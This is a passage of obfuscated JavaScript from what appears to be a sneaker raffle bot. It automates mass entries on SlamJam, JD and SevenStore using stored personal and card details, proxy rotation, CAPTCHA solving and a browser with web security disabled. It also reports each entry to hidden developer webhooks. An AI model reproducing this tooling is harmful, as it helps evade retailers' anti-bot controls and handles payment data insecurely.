            await _0x1bc78e['click']('.product-select-variant-wrapper'), await _0x1b3ea1(0x320), await _0x1bc78e['click']('li.product-select-variant__value[data-size=\x22' + _0x12f5f0[_0x5d1f9a]['Size'] + '\x22]'), await _0x1b3ea1(0x384), await _0x1bc78e['$eval']('#AddToCartForm-product-template-raffle', _0x40a8c3 => _0x40a8c3['submit']()), await _0x1bc78e['waitForSelector']('.cart-order-summary__content'), await _0x1b3ea1(0x514), await _0x1bc78e['goto']('https://drop.slamjam.com/checkout'), await _0x1b3ea1(0x514), await _0x1bc78e['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1bc78e['select']('#checkout_shipping_address_country', '' + _0x12f5f0[_0x5d1f9a]['Country']), await _0x1b3ea1(0x200), await _0x1bc78e['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1bc78e['type']('#checkout_shipping_address_first_name', '' + _0x12f5f0[_0x5d1f9a]['FirstName']), await _0x1b3ea1(0x237), await _0x1bc78e['type']('#checkout_shipping_address_last_name', '' + _0x12f5f0[_0x5d1f9a]['LastName']), await _0x1b3ea1(0x1e0), await _0x1bc78e['type']('#checkout_shipping_address_address1', _0x12f5f0[_0x5d1f9a]['Address1'] + '\x20' + _0x12f5f0[_0x5d1f9a]['HouseNumber']), await _0x1b3ea1(0x514), await _0x1bc78e['type']('#checkout_shipping_address_address2', '' + _0x12f5f0[_0x5d1f9a]['Address2']), await _0x1b3ea1(0x514);
            _0x12f5f0[_0x5d1f9a]['Postcode'] == undefined && (_0x12f5f0[_0x5d1f9a]['Postcode'] = _0x12f5f0[_0x5d1f9a]['Zip']);
            await _0x1bc78e['type']('#checkout_shipping_address_zip', '' + _0x12f5f0[_0x5d1f9a]['Postcode']), await _0x1b3ea1(0x2bc), await _0x1bc78e['type']('#checkout_shipping_address_city', '' + _0x12f5f0[_0x5d1f9a]['City']), await _0x1b3ea1(0x320), await _0x1bc78e['type']('#checkout_shipping_address_phone', '' + _0x12f5f0[_0x5d1f9a]['Phone']), await _0x1b3ea1(0x320), await _0x1bc78e['click']('#continue_button'), await _0x1b3ea1(0xbb8), await _0x1bc78e['waitForSelector']('.summary-title'), await _0x1b3ea1(0x320), await _0x1bc78e['click']('#continue_button'), await _0x1b3ea1(0x320), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1bc78e['waitForSelector']('#checkout_credit_card_vault'), await _0x1b3ea1(0x3e8);
            var _0x510366 = await _0x1bc78e['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0xcd431b = await _0x510366['contentFrame']();
            await _0xcd431b['click']('#number'), await _0x1b3ea1(0x3e8), await _0xcd431b['type']('#number', '' + _0x12f5f0[_0x5d1f9a]['CardNumber'], { 'delay': 0x78 }), _0x510366 = await _0x1bc78e['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0xcd431b = await _0x510366['contentFrame'](), await _0x1b3ea1(0x1c2), await _0xcd431b['click']('#name'), await _0x1b3ea1(0x1f4), await _0xcd431b['type']('#name', '' + _0x12f5f0[_0x5d1f9a]['NameOnCard'], { 'delay': 0x78 }), _0x510366 = await _0x1bc78e['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0xcd431b = await _0x510366['contentFrame'](), await _0x1b3ea1(0x1c2), await _0xcd431b['click']('#expiry'), await _0x1b3ea1(0x1f4), await _0xcd431b['type']('#expiry', '' + _0x12f5f0[_0x5d1f9a]['ExpiryDate'], { 'delay': 0x78 }), _0x510366 = await _0x1bc78e['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0xcd431b = await _0x510366['contentFrame'](), await _0x1b3ea1(0x1c2), await _0xcd431b['click']('#verification_value'), await _0x1b3ea1(0x1f4), await _0xcd431b['type']('#verification_value', '' + _0x12f5f0[_0x5d1f9a]['CVV'], { 'delay': 0x78 }), await _0x1bc78e['$eval']('#accepts-flag-raffle', _0x1ad24d => _0x1ad24d['click']()), await _0x1b3ea1(0x7d0), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1bc78e['$eval']('#continue_button', _0x5c7a26 => _0x5c7a26['click']()), await _0x1b3ea1(0x1b58), await _0x1bc78e['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1bc78e['$eval']('.edit_checkout.animate-floating-labels', _0x5c16c3 => _0x5c16c3['submit']()), await _0x1b3ea1(0x7d0);
            try {
                await _0x1bc78e['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x599ce8 = 'no', _0x1dc885(_0x12f5f0[_0x5d1f9a], _0x274bc6), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x50fe2c) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x50fe2c['message']);
            }
            var _0x32d169 = await _0x555e75(_0x12f5f0[_0x5d1f9a], _0x274bc6, 'dev', ![]), _0x4c0272 = await _0x555e75(_0x12f5f0[_0x5d1f9a], _0x274bc6, 'pub', ![]);
            const _0x3ca53b = {
                'succesDEVMSG': { 'embeds': [_0x32d169] },
                'succesPUBMSG': { 'embeds': [_0x4c0272] }
            };
            try {
                _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x3ca53b['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x3ca53b['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x45d3b5, _0x3ca53b['succesPUBMSG']);
            } catch (_0x491f6e) {
                console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x491f6e));
            }
        } catch (_0x46d58c) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20' + _0x46d58c)), _0x49086e = '' + _0x46d58c;
            var _0x18b34f = await _0x555e75(kickz[_0x5d1f9a], _0x274bc6, 'dev', !![], _0x49086e);
            EMBEDS['errorDEV'] = { 'embeds': [_0x18b34f] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], EMBEDS['errorDEV']), await _0x57e113(_0x570583, EMBEDS['errorDEV']), _0x599ce8 = 'yes';
        } finally {
            _0x4a911f && _0x4a911f['close']();
            if (_0x599ce8 == 'yes' && _0x56eb8b != 0x5 && _0x49086e != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Retrying')), _0x5d1f9a = _0x5d1f9a - 0x1, _0x56eb8b = _0x56eb8b + 0x1;
                continue;
            }
            _0x599ce8 == 'yes' && _0x56eb8b >= 0x5 && (_0x254c07(_0x12f5f0[_0x5d1f9a], _0x274bc6), _0x599ce8 = 'no', _0x56eb8b = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x4d3934(_0x571cf1, _0x42e1ed, _0xa05546) {
    var _0x38cef7 = ![], _0x54aad6 = ![];
    if (_0xc43b8d['captchaKey'] == '' || _0xc43b8d['captchaKey'] == undefined)
        return console['log'](_0x3e492c['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x373d0c = 0x0; _0x373d0c < _0x42e1ed['length']; _0x373d0c++) {
        if (_0x4cbb68 != 'yes')
            var _0x4cbb68 = '', _0x285b8c = 0x0;
        var _0x1ead25, _0x5cf6d6 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x42e1ed[_0x373d0c]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x42e1ed[_0x373d0c]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }];
        const _0x51acca = { 'embeds': _0x5cf6d6 };
        _0x2768f8(_0x571cf1['name'] + '\x20Task\x20' + (_0x373d0c + 0x1) + '\x20/\x20' + _0x42e1ed['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x42e1ed, _0x373d0c);
        var _0x5c6e0f = await _0x555e75(_0x42e1ed[_0x373d0c], _0x571cf1, 'dev', ![]), _0xe9956f = await _0x555e75(_0x42e1ed[_0x373d0c], _0x571cf1, 'pub', ![]);
        const _0xc4c9b8 = {
            'succesDEVMSG': { 'embeds': [_0x5c6e0f] },
            'succesPUBMSG': { 'embeds': [_0xe9956f] }
        };
        if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
            try {
                await _0x57e113(_0xc43b8d['webhook'], _0xc4c9b8['succesDEVMSG']);
            } catch {
            }
        await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0xc4c9b8['succesDEVMSG']), await _0x1b3ea1(0xc8);
        try {
            await _0x57e113(_0x45d3b5, _0xc4c9b8['succesPUBMSG']);
        } catch {
        }
        if (_0x42e1ed[_0x373d0c]['Email'] == '' || _0x42e1ed[_0x373d0c]['Url'] == '' || _0x42e1ed[_0x373d0c]['FirstName'] == '' || _0x42e1ed[_0x373d0c]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x33eb26 = _0xa05546[_0x373d0c]['split'](':');
        else
            var _0x294d5e = Math['round'](Math['random']() * (_0xa05546['length'] - 0x1)), _0x33eb26 = _0xa05546[_0x294d5e]['split'](':');
        const _0x126761 = await _0x114f6['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x33eb26[0x0] + ':' + _0x33eb26[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4f1c60 = await _0x126761['newPage']();
            await _0x4f1c60['authenticate']({
                'username': '' + _0x33eb26[0x2],
                'password': '' + _0x33eb26[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4f1c60['setRequestInterception'](!![]), _0x4f1c60['on']('request', _0x4022a6 => {
                _0x4022a6['resourceType']() === 'image' || _0x4022a6['resourceType']() === 'font' || _0x4022a6['resourceType']() === 'media' ? _0x4022a6['abort']() : _0x4022a6['continue']();
            }), await _0x4f1c60['goto']('' + _0x42e1ed[_0x373d0c]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x4f1c60['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4f1c60['type']('#comp_firstname', '' + _0x42e1ed[_0x373d0c]['FirstName']), await _0x4f1c60['waitForSelector']('#comp_lastname'), await _0x4f1c60['type']('#comp_lastname', '' + _0x42e1ed[_0x373d0c]['LastName']), await _0x4f1c60['waitForSelector']('#comp_email'), await _0x4f1c60['type']('#comp_email', '' + _0x42e1ed[_0x373d0c]['Email']), await _0x4f1c60['waitForSelector']('#comp_paypalemail'), await _0x4f1c60['type']('#comp_paypalemail', '' + _0x42e1ed[_0x373d0c]['Email']), await _0x4f1c60['waitForSelector']('#comp_mobile_end'), await _0x4f1c60['type']('#comp_mobile_end', '' + _0x42e1ed[_0x373d0c]['Phone']), await _0x4f1c60['waitForSelector']('#comp_dob'), await _0x4f1c60['type']('#comp_dob', '08/09/1992'), console['log'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x42e1ed[_0x373d0c]['Size'] == 'RANDOM') {
                const _0x50376a = await _0x4f1c60['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xcce9f3 => {
                    return _0xcce9f3['map'](_0x4e82d6 => _0x4e82d6['value']);
                });
                var _0x44c6fd = Math['round'](Math['random']() * (_0x50376a['length'] - 0x2));
                await _0x4f1c60['select']('#shoesize', _0x50376a[_0x44c6fd + 0x1]), await _0x1b3ea1(0x3e8);
            } else {
                const _0x17cced = await _0x4f1c60['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3d8a64 => {
                    return _0x3d8a64['map'](_0x3e08bf => _0x3e08bf['innerText']);
                }), _0x588ea4 = await _0x4f1c60['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4a8d2d => {
                    return _0x4a8d2d['map'](_0x5e0431 => _0x5e0431['value']);
                });
                var _0x119419 = _0x42e1ed[_0x373d0c]['Size'];
                for (var _0x350dc0 = 0x1; _0x350dc0 < _0x588ea4['length']; _0x350dc0++) {
                    var _0x333478 = _0x17cced[_0x350dc0]['split']('\x20')[0x0];
                    if (_0x333478 == _0x119419) {
                        await _0x4f1c60['select']('#shoesize', _0x588ea4[_0x350dc0]);
                        break;
                    } else {
                        if (_0x350dc0 + 0x1 == _0x588ea4['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x4f1c60['waitForSelector']('#comp_address1'), await _0x4f1c60['type']('#comp_address1', _0x42e1ed[_0x373d0c]['Address1'] + '\x20' + _0x42e1ed[_0x373d0c]['HouseNumber']), await _0x4f1c60['waitForSelector']('#comp_address2'), await _0x4f1c60['type']('#comp_address2', '' + _0x42e1ed[_0x373d0c]['Address2']), await _0x4f1c60['waitForSelector']('#comp_address2'), await _0x4f1c60['type']('#comp_address3', '' + _0x42e1ed[_0x373d0c]['City']), await _0x4f1c60['waitForSelector']('#comp_postcode'), await _0x4f1c60['type']('#comp_postcode', '' + _0x42e1ed[_0x373d0c]['Zip']), console['log'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1b3ea1(0x4b0), await _0x4f1c60['click']('label#emailhold'), await _0x1b3ea1(0x5dc), await _0x4f1c60['click']('#preauth_tandc_email\x20>\x20label'), await _0x1b3ea1(0x5dc), await _0x4f1c60['click']('#submit'), await _0x4f1c60['waitForSelector']('#paymentWrap'), console['log'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20' + _0x3e492c['blue']('Awaiting\x20Paypal\x20Payment')), _0x126761['on']('targetcreated', async _0x183eaa => {
                if (_0x183eaa['type']() === 'page') {
                    const _0x2a9bdd = await _0x183eaa['page']();
                    async function _0x1cebbf() {
                        try {
                            await _0x4f1c60['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x54aad6 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x301f00() {
                        try {
                            await _0x4f1c60['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x38cef7 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x301f00(), _0x1cebbf(), await _0x1b3ea1(0x493e0);
                }
            });
            async function _0x4a2d42() {
                for (let _0x77b4f1 = 0x0; _0x77b4f1 < 0x12c; _0x77b4f1++) {
                    if (_0x38cef7 == !![]) {
                        _0x4cbb68 = 'no', _0x1dc885(_0x42e1ed[_0x373d0c], _0x571cf1), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
                            try {
                                await _0x57e113(_0xc43b8d['webhook'], _0xc4c9b8['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0xc4c9b8['succesDEVMSG']), await _0x1b3ea1(0xc8);
                        try {
                            await _0x57e113(_0x45d3b5, _0xc4c9b8['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x54aad6)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x1b3ea1(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x1b3ea1(0xbb8), await _0x4f1c60['click']('.zoid-outlet'), await _0x1b3ea1(0x7d0), await _0x4a2d42();
        } catch (_0x417235) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20' + _0x417235)), _0x1ead25 = '' + _0x417235;
            var _0x4f1088 = await _0x555e75(_0x42e1ed[_0x373d0c], _0x571cf1, 'dev', !![], _0x1ead25);
            _0xc4c9b8['errorDEV'] = { 'embeds': [_0x4f1088] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0xc4c9b8['errorDEV']), await _0x57e113(_0x570583, _0xc4c9b8['errorDEV']);
        } finally {
            _0x126761 && _0x126761['close']();
            if (_0x4cbb68 == 'yes' && _0x285b8c != 0x5 && _0x1ead25 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x571cf1['name'] + ']\x20Task\x20' + (_0x373d0c + 0x1) + '\x20:\x20Retrying')), _0x373d0c = _0x373d0c - 0x1, _0x285b8c = _0x285b8c + 0x1;
                continue;
            }
            _0x4cbb68 == 'yes' && _0x285b8c >= 0x5 && (_0x254c07(afew[_0x373d0c], _0x571cf1), _0x4cbb68 = 'no', _0x285b8c = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x29601b(_0x341333, _0x2028e8, _0x5d6c4e) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3615de = 0x0; _0x3615de < _0x2028e8['length']; _0x3615de++) {
        _0x2768f8(_0x341333['name'] + '\x20Task\x20' + (_0x3615de + 0x1) + '\x20/\x20' + _0x2028e8['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        var _0x158eb2 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2028e8[_0x3615de]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2028e8[_0x3615de]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xc43b8d['version']
                }
            ]
        }];
        const _0x42b969 = { 'embeds': _0x158eb2 };
        await _0x3cdb09(_0x2028e8, _0x3615de);
        if (_0x2028e8[_0x3615de]['Email'] == '' || _0x2028e8[_0x3615de]['Password'] == '' || _0x2028e8[_0x3615de]['FirstName'] == '' || _0x2028e8[_0x3615de]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x2028e8[_0x3615de]['Password'] == '' || _0x2028e8[_0x3615de]['Password'] == undefined) && (_0x2028e8[_0x3615de]['Password'] = 'ErehsaWonRaj1!');
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x117f72 = _0x5d6c4e[_0x3615de]['split'](':');
        else
            var _0x606ee2 = Math['round'](Math['random']() * (_0x5d6c4e['length'] - 0x1)), _0x117f72 = _0x5d6c4e[_0x606ee2]['split'](':');
        const _0x1604f5 = await _0x114f6['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x117f72[0x0] + ':' + _0x117f72[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x160009 = await _0x1604f5['newPage']();
            await _0x160009['authenticate']({
                'username': '' + _0x117f72[0x2],
                'password': '' + _0x117f72[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Getting\x20Session'), await _0x160009['setRequestInterception'](!![]), _0x160009['on']('request', _0x262dbb => {
                _0x262dbb['resourceType']() === 'image' || _0x262dbb['resourceType']() === 'font' || _0x262dbb['resourceType']() === 'media' ? _0x262dbb['abort']() : _0x262dbb['continue']();
            }), await _0x160009['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x160009['goto']('' + _0x2028e8[_0x3615de]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x160009['waitForSelector']('#btnPdpAtb'), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2028e8[_0x3615de]['Size']);
            const _0xea541c = await _0x160009['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x3eb2fe => {
                return _0x3eb2fe['map'](_0xe0fe42 => _0xe0fe42['innerText']);
            }), _0x33dc8d = await _0x160009['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x296fc4 = ![];
            if (_0x2028e8[_0x3615de]['Size'] == 'RANDOM') {
                var _0x3dd45a = Math['round'](Math['random']() * (_0x33dc8d['length'] - 0x1));
                await _0x33dc8d[_0x3dd45a]['click']();
            } else
                for (var _0x139cb5 = 0x0; _0x139cb5 < _0xea541c['length']; _0x139cb5++) {
                    if (_0xea541c[_0x139cb5] != _0x2028e8[_0x3615de]['Size'])
                        continue;
                    try {
                        await _0x33dc8d[_0x139cb5]['click']();
                    } catch {
                        console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x296fc4 = !![];
                    }
                }
            if (_0x296fc4)
                continue;
            await _0x1b3ea1(0x578), await _0x160009['click']('#btnPdpAtb'), await _0x160009['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x1b3ea1(0x3e8), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x160009['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x160009['waitForSelector']('#email'), await _0x160009['type']('#email', _0x2028e8[_0x3615de]['Email']), await _0x1b3ea1(0x226), await _0x160009['click']('#guest-submit'), await _0x1b3ea1(0x1b58), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Filling\x20Information'), await _0x160009['waitForSelector']('#firstname'), await _0x160009['type']('#firstname', _0x2028e8[_0x3615de]['FirstName'], 0x1f4), await _0x1b3ea1(0x190), await _0x160009['waitForSelector']('#surname'), await _0x160009['type']('#surname', _0x2028e8[_0x3615de]['LastName'], 0x1f4), await _0x1b3ea1(0x190), await _0x160009['waitForSelector']('#mobile'), await _0x160009['type']('#mobile', _0x2028e8[_0x3615de]['Phone'], 0x1f4), await _0x1b3ea1(0x190), await _0x160009['click']('#enterManualDiv'), await _0x1b3ea1(0x5dc), await _0x160009['waitForSelector']('#address1'), await _0x160009['type']('#address1', _0x2028e8[_0x3615de]['Address1'] + '\x20' + _0x2028e8[_0x3615de]['HouseNumber'], 0x226), await _0x1b3ea1(0x384), await _0x160009['waitForSelector']('#address2'), await _0x160009['type']('#address2', '' + _0x2028e8[_0x3615de]['Address2'], 0x226), await _0x1b3ea1(0x320);
            const _0x1dc3aa = await _0x160009['$$eval']('#countryselect_view3\x20>\x20option', _0x1f1cd3 => {
                return _0x1f1cd3['map'](_0xec42af => _0xec42af['value']);
            });
            var _0x5224d5;
            for (var _0x1ca39f = 0x0; _0x1ca39f < _0x1dc3aa['length']; _0x1ca39f++) {
                if (_0x1dc3aa[_0x1ca39f]['startsWith']('' + _0x2028e8[_0x3615de]['Country'])) {
                    _0x5224d5 = _0x1dc3aa[_0x1ca39f];
                    break;
                }
                continue;
            }
            await _0x160009['select']('#countryselect_view3', '' + _0x5224d5), await _0x160009['waitForSelector']('#address4'), await _0x160009['type']('#address4', '' + _0x2028e8[_0x3615de]['City'], 0x1f4), await _0x1b3ea1(0x384), await _0x160009['waitForSelector']('#postcode'), await _0x160009['type']('#postcode', '' + _0x2028e8[_0x3615de]['Zip'], 0x1f4), await _0x1b3ea1(0x4b0);
            const _0x2b4653 = await _0x160009['url']();
            console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x114086 = _0x2b4653['split']('?')[0x1], _0x2d4c1 = await _0x160009['$']('#co_address_submit');
            await _0x2d4c1['evaluate'](_0x5d3dd6 => _0x5d3dd6['click']()), await _0x1b3ea1(0x1388), await _0x160009['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x114086), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x160009['waitForSelector']('#paymentbuttons'), await _0x1b3ea1(0x1388), await _0x160009['click']('#paymentbuttons\x20>\x20div'), await _0x1b3ea1(0x1c2), await _0x160009['waitForSelector']('#card-number'), await _0x160009['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x4a8da6 = await _0x160009['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x24a61a = await _0x4a8da6['contentFrame']();
            await _0x24a61a['waitForSelector']('.InputContainer'), await _0x24a61a['click']('.InputContainer\x20>\x20input'), await _0x1b3ea1(0x578), await _0x160009['type']('#card-number', '' + _0x2028e8[_0x3615de]['CreditNumber']), await _0x1b3ea1(0xfa), await _0x160009['type']('#card-expiry', '' + _0x2028e8[_0x3615de]['ExpiryDate']), await _0x1b3ea1(0xfa), await _0x160009['type']('#card-cvc', '' + _0x2028e8[_0x3615de]['CVV']), await _0x1b3ea1(0x7d0), await _0x160009['click']('#card-button'), console['log'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x160009['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x57e113(_0x344e4d, _0x42b969);
            } catch {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x203DS\x20Failed')), _0x158eb2[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x158eb2[0x0]['description'] = '3DS\x20Failed', await _0x57e113(_0x570583, _0x42b969);
            }
        } catch (_0x5ca52c) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x341333['name'] + ']\x20Task\x20' + (_0x3615de + 0x1) + '\x20:\x20' + _0x5ca52c)), _0x158eb2[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x158eb2[0x0]['description'] = '' + _0x5ca52c, await _0x57e113(_0x570583, _0x42b969);
        } finally {
            _0x1604f5 && _0x1604f5['close']();
            if (_0x3615de + 0x1 == _0x2028e8['length']) {
                console['log'](_0x3e492c['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x1b3ea1(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xc43b8d['AfewDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['AfewDelay']);
        }
    }
}
async function _0x1594fd(_0x4b4489, _0x4b1938, _0x597b81, _0x49d8fd, _0x4caeb4) {
    var _0x2c95f8, _0x1d1db9 = {}, _0x532009 = [], _0x7742e = {}, _0x1739d8 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x49d8fd && (_0x49d8fd = {});
    if (_0x4b1938 != 'ver') {
